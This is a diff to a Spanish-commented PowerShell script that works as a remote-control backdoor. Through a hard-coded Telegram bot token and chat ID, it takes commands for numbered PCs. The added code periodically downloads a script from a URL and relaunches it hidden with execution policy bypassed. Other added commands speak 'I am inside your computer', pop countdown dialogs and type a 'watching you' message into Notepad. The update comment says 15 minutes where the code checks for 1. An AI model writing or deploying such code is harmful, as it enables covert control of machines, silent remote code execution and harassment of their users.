@@ -4,6 +4,10 @@
 $Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TOKEN REAL COMPLETO
 $ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO
 
+# para la auto-actualización (Misma que usa el cargador)
+$UrlGitHub  = "https://githubusercontent.com" 
+$RutaLocal  = "$PSScriptRoot\cliente_base.ps1"
+
 # Construcción de URL fija ultra-estable que acabamos de validar
 $URL    = "https://api.telegram.org/bot" + $Token
 $MiPC   = $env:COMPUTERNAME
@@ -11,10 +15,12 @@ $User   = $env:USERNAME
 # ==============================================================================
 # NO BORRAR #############################################################
 # ==============================================================================
+# Control de tiempo para la actualización automática (Cada 15 minutos)
+$Cronometro = [System.Diagnostics.Stopwatch]::StartNew()
+
 # ==============================================================================
-# CONFIGURACIÓN DEL BOT DE TELEGRAM 
+# REGISTRAR APIS Y SEGURIDAD
 # ==============================================================================
-# Registrar APIs de pantalla de Windows de forma segura
 try {
     $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
     Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
@@ -46,6 +52,29 @@ try {
 # ==============================================================================
 while ($true) {
     try {
+        # 🔄 SISTEMA DE AUTO-ACTUALIZACIÓN CADA 15 MINUTOS 🔄
+        if ($Cronometro.Elapsed.TotalMinutes -ge 1) {
+            try {
+                # Intenta descargar la nueva versión de GitHub
+                Invoke-WebRequest -Uri $UrlGitHub -OutFile $RutaLocal -TimeoutSec 10 -ErrorAction Stop
+                
+                # Si se descargó con éxito, ejecuta la nueva versión de forma invisible
+                if (Test-Path $RutaLocal) {
+                    Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$RutaLocal`""
+                    
+                    # Notifica al bot que se actualizó con éxito
+                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "🔄 Script ID [$MiPC] actualizado automáticamente a la última versión de GitHub." })
+                    
+                    # Termina el script viejo inmediatamente para que no queden dos corriendo
+                    Exit
+                }
+            } catch {
+                # Si falla (ej. sin internet), reinicia el cronómetro para reintentar en 15 min
+                $Cronometro.Restart()
+            }
+        }
+
+        # Conexión con Telegram (Espera mensajes hasta por 15 segundos)
         $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
         
         foreach ($Update in $Updates.result) {
@@ -55,7 +84,6 @@ while ($true) {
 
             if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                 
-                # CORRECCIÓN DE MATRIZ: Extraemos de forma segura el comando y el ID del argumento
                 $Partes = $TextoRecibido -split " "
                 $Comando = [string]$Partes[0]
                 $Comando = $Comando.ToLower()
@@ -67,7 +95,6 @@ while ($true) {
 
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
-                    # Calcula un ID del 1 al 9 único y fijo para esta PC según su nombre
                     $LetrasPC = [char[]]$MiPC
                     $TotalAscii = 0
                     foreach ($Letra in $LetrasPC) { $TotalAscii += [int]$Letra }
@@ -84,12 +111,12 @@ while ($true) {
                 if ($Comando -eq "/ayuda") {
                     $TextoAyuda = "MANUAL DE CONTROL NUMERICO`n`n" +
                                   "Comandos Globales:`n" +
-                                  "• /lista - Ver que numero de ID tomo cada PC.`n" +
-                                  "• /ayuda - Ver este menu.`n`n" +
-                                  "Comandos Individuales (Deja un espacio y pon el numero de la PC):`n" +
-                                  "• /pantalla_off [Numero]`n" +
-                                  "• /pantalla_on [Numero]`n" +
-                                  "• /notepad [Numero]`n`n" +
+                                  " /lista - Ver que numero de ID tomo cada PC.`n" +
+                                  " /ayuda - Ver este menu.`n`n" +
+                                  "Comandos Individuales:`n" +
+                                  " /cuenta [Numero]`n" +
+                                  " /dentro [Numero]`n" +
+                                  " /notepad [Numero]`n`n" +
                                   "Ejemplo de uso: /notepad 1"
                     
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
@@ -108,23 +135,26 @@ while ($true) {
                 if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                     
                     switch ($Comando) {
-                        "/pantalla_off" {
-                            $rundll = New-Object -ComObject WScript.Shell
-                            $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
-                            [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla apagada en ID " + $MiIDNum })
-                        }
-                        "/pantalla_on" {
+                        
+                        "/dentro" {
+                            Add-Type -AssemblyName System.Speech
+                            $synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer
+                            $synthesizer.Speak("Hola. Estoy dentro de tu computadora.")
+                        }                       
+                        
+                        "/cuenta" {
                             $wsh = New-Object -ComObject WScript.Shell
-                            $wsh.SendKeys("{SHIFT}")
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
+                            for ($i = 60; $i -gt 0; $i--) {
+                                $wsh.Popup("Faltan $i segundos para desbloquear la pantalla.", 1, "Cuenta Regresiva", 0 + 48 + 4096)
+                            }
                         }
+                           
                         "/notepad" {
-                            notepad.exe
+                            Start-Process "notepad.exe"
                             Start-Sleep -Milliseconds 500
                             $wsh = New-Object -ComObject WScript.Shell
                             $wsh.SendKeys("Te estoy observando por Internet... 👀")
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                         }
                     }
                 }
@@ -135,7 +165,3 @@ while ($true) {
     }
     Start-Sleep -Seconds 2
 }
-
-
-
-                
